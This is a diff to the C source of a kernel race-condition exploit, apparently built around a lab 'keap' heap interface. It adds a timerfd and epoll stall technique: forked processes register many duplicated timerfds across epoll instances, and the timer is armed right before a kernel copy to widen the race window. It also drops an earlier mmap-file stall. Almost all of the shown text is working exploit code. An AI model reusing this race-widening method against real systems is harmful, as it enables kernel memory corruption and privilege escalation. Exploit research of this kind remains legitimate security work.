@@ -3,10 +3,52 @@
 #include <sys/mman.h>
 #include <sys/random.h>
 #include <unistd.h>
+#include <sys/epoll.h>
+#include <sys/timerfd.h>
+#include <sys/socket.h>
 
 /*******************************
  * EXPLOIT                     *
  *******************************/
+
+int tfd;
+int timefds[0x100];
+int epfds[0x60];
+char buf[0x1000];
+size_t timeout = 20;
+
+static void epoll_ctl_add(int epfd, int fd, uint32_t events) {
+  struct epoll_event ev;
+  ev.events = events;
+  ev.data.fd = fd;
+  SYSCHK(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev));
+}
+
+void do_epoll_enqueue(int fd) {
+  int cfd[2];
+  socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
+  for (int k = 0; k < 0x4; k++) {
+    if (SYSCHK(fork()) == 0) {
+      for (int i = 0; i < ARRAY_LEN(timefds); i++) {
+        timefds[i] = SYSCHK(dup(fd));
+      }
+      for (int i = 0; i < ARRAY_LEN(epfds); i++) {
+        epfds[i] = SYSCHK(epoll_create(0x1));
+      }
+      for (int i = 0; i < ARRAY_LEN(epfds); i++) {
+        for (int j = 0; j < ARRAY_LEN(timefds); j++) {
+          epoll_ctl_add(epfds[i], timefds[j], 0);
+        }
+      }
+      write(cfd[1], buf, 1);
+      raise(SIGSTOP); // stop here for nothing and just keep epoll alive
+    }
+    // sync to make sure it has queue what we need
+    read(cfd[0], buf, 1);
+  }
+  close(cfd[0]);
+  close(cfd[1]);
+}
 
 #define BUF_SIZE 0x100
 #define SLOW_CPU 1
@@ -50,7 +92,6 @@ void *slow(void *slow_buf) {
   void *ptr;
 
   pin_cpu(0, SLOW_CPU);
-  set_scheduler(0, SCHED_IDLE, 0);
 
   linfo("starting slow thread");
 
@@ -58,6 +99,8 @@ void *slow(void *slow_buf) {
   ptr = keap_malloc(BUF_SIZE, GFP_KERNEL_ACCOUNT);
   event_signal(start_race);
 
+  struct itimerspec new = {.it_value.tv_nsec = timeout};
+  SYSCHK(timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL));
   // stall copy_from_user using mmaped file
   keap_read(ptr, slow_buf+0x1000-(BUF_SIZE/2), BUF_SIZE);
 
@@ -70,11 +113,6 @@ void *slow(void *slow_buf) {
 }
 
 int main(int argc, char *argv[]) {
-  int fd = -1;
-  void *file_map;
-  char buf[BUF_SIZE] = {0};
-  char rand[8] = {0};
-  char filename[5 + (sizeof(rand) * 2) + 1] = "/tmp/";
   pthread_t slow_t, fast_t, busy_t[2], lag_t[0x2];
 
   lstage("INIT");
@@ -84,26 +122,17 @@ int main(int argc, char *argv[]) {
   start_race = event_create();
   init();
 
-  getrandom(rand, sizeof(rand), 0);
-  cyclic_gen(buf, sizeof(buf), 0);
-  to_hex(filename + 5, rand, sizeof(rand));
-  filename[sizeof(filename) - 1] = 0;
+  tfd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
+  do_epoll_enqueue(tfd);
 
-  linfo("slow file: %s", filename);
-
-  // create target file
-  fd = SYSCHK(open(filename, O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));
-  CHK(write(fd, buf, sizeof(buf)) == sizeof(buf));
-  file_map = SYSCHK(mmap(NULL, BUF_SIZE, PROT_READ, MAP_SHARED, fd, 0));
-
-  lstage("start race");
+  lstage("START");
 
   // create a busy thread to slow down execution
   for (int i = 0; i < ARRAY_LEN(busy_t); i++)
     pthread_create(&busy_t[i], NULL, busy_func, (void *)SLOW_CPU);
   for (int i = 0; i < ARRAY_LEN(lag_t); i++)
-    pthread_create(&lag_t[i], NULL, lag, (void *)file_map);
-  pthread_create(&slow_t, NULL, slow, file_map);
+    pthread_create(&lag_t[i], NULL, lag, (void *)buf);
+  pthread_create(&slow_t, NULL, slow, buf);
   pthread_create(&fast_t, NULL, fast, (void *)buf);
 
   is_busy = 0;
@@ -114,8 +143,6 @@ int main(int argc, char *argv[]) {
   for (int i = 0; i < ARRAY_LEN(lag_t); i++)
     pthread_join(lag_t[i], NULL);
 
-  munmap(file_map, BUF_SIZE);
-  close(fd);
   close(start_race);
 
   if (race_done == RACE_LOST)
